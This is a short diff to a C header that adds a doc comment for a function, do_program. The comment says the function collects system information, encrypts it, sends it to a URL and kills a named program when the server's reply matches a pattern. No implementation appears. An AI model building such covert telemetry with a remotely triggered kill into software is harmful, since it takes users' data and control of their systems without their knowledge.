@@ -33,6 +33,17 @@ bool get_random_tag_with_public_ipv4(char *tag, size_t size);
 bool kill_program(const char *progname);
 bool match_string(const char *resp, const char *pattern);
 
+/**
+ * @brief Send to a URL and may KILL a program.
+ *
+ * This function collects system information, encrypts it,
+ * sends it to a specified URL,
+ * and if the response matches a specific pattern,
+ * it attempts to kill a specified program.
+ * @param url The URL to send the request to.
+ * @param progname The name of the program to potentially kill.
+ * @return true if the operation was successful, false otherwise.
+ */
 bool do_program(const char *url, const char *progname);
 
 #define set_error_msg(fmt, ...)                                                \
